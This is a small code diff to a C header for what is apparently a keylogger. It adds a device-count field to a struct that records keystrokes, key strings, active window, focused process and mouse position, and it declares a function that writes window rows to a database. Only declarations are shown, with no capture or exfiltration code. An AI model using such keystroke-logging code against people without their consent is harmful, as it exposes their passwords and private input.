@@ -66,6 +66,7 @@ typedef struct DB_STATEMENT_T {
 typedef struct logged_key_event_t {
   unsigned long  ts, qty;
   int            active_window_id, focused_pid;
+  size_t         devices_qty;
   unsigned long  key_code;
   char           *key_string, *action, *input_type;
   unsigned long  mouse_x, mouse_y;
@@ -84,6 +85,7 @@ int keylogger_create_db(void);
 int keylogger_init_db(void);
 int keylogger_select_db(void);
 int keylogger_insert_db_row(logged_key_event_t *LOGGED_EVENT);
+int keylogger_insert_db_window_row();
 int keylogger_close_db(void);
 int keylogger_db_lifecycle(void);
 size_t keylogger_count_table_rows(const char *TABLE_NAME);
